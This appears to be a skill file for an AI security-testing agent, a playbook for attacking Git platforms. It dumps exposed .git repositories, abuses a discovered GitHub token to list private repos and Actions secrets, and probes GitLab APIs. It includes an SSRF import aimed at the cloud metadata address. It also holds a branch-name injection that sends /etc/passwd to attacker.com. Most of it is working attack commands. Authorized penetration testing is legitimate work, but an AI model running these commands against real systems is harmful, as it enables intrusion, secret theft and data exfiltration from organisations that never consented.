---
name: tech-git-platforms
description: "Git platform security testing — GitLab/GitHub/Gitea misconfigs, exposed .git repos, API token abuse, CI/CD pipeline injection, secret scanning in public repos. Triggers: 'gitlab security', 'github security', 'gitea security', 'git platform', 'exposed git', 'ci pipeline injection', 'git secret'."
---

# Git Platform Security Testing

Test GitLab, GitHub, Gitea, and exposed .git repositories for access control failures and secret exposure.

## Phase 1: Exposed .git Repository

```bash
TARGET="https://TARGET"

curl -s "$TARGET/.git/HEAD"
curl -s "$TARGET/.git/config"

git-dumper "$TARGET/.git" /workspace/output/git-dump/

cd /workspace/output/git-dump && git log --oneline
git show HEAD -- config.php
git log --all --oneline | head -20

trufflehog filesystem /workspace/output/git-dump/ --json | jq .
gitleaks detect --source /workspace/output/git-dump/ -v
```

## Phase 2: GitHub API Abuse

```bash
TOKEN="ghp_XXXXXXXX"  # discovered token
ORG="target-org"

curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/orgs/$ORG/repos?per_page=100&type=all" | jq '.[].full_name'

curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/user/repos?visibility=all" | jq '.[].full_name'

curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/orgs/$ORG/actions/secrets" | jq '.secrets[].name'

curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/search/code?q=password+org:$ORG&per_page=10" | jq '.items[].html_url'
```

## Phase 3: GitLab Misconfigurations

```bash
GITLAB="https://gitlab.TARGET.com"

curl -s "$GITLAB/api/v4/projects?visibility=public&per_page=20" | jq '.[].web_url'

curl -s "$GITLAB/api/v4/users" | jq '.[].username'
curl -s "$GITLAB/api/v4/groups" | jq '.[].name'

curl -s -X POST "$GITLAB/-/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq '.data.__schema.types[].name'

curl -s "$GITLAB/users/password/new" -c /tmp/gl_cookies.txt | grep csrf

curl -s -X POST "$GITLAB/api/v4/projects" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -d "name=test&import_url=http://169.254.169.254/latest/meta-data/"
```

## Phase 4: CI/CD Pipeline Injection

```bash
# - run: eval "${{ github.event.pull_request.title }}"  ← injectable
# - uses: actions/checkout@${{ inputs.ref }}            ← ref injection

#   - eval "$USER_INPUT"   ← injectable

git checkout -b 'main; curl attacker.com/$(cat /etc/passwd | base64)'
git push origin HEAD

grep -r '\${{' .github/workflows/
grep -r 'eval\|exec\|system' .gitlab-ci.yml
```

## Phase 5: Secret Scanning

```bash
trufflehog git https://github.com/ORG/REPO --json 2>/dev/null | jq '{branch,commit,reason,stringsFound}'
gitleaks detect --source . --report-path /workspace/output/gitleaks.json

git log --all --full-history -- "**/.env" | grep commit | awk '{print $2}' | \
  xargs -I{} git show {}:.env 2>/dev/null
```

## Output

Save to `/workspace/output/`:
- `git-dump/` — reconstructed source code
- `gitleaks.json` — secret findings
- `ci-injectable.txt` — injectable CI/CD patterns found

## Next Phase

→ `recon-secrets` for broader secret scanning
→ `vuln-ssrf` if GitLab import URL available
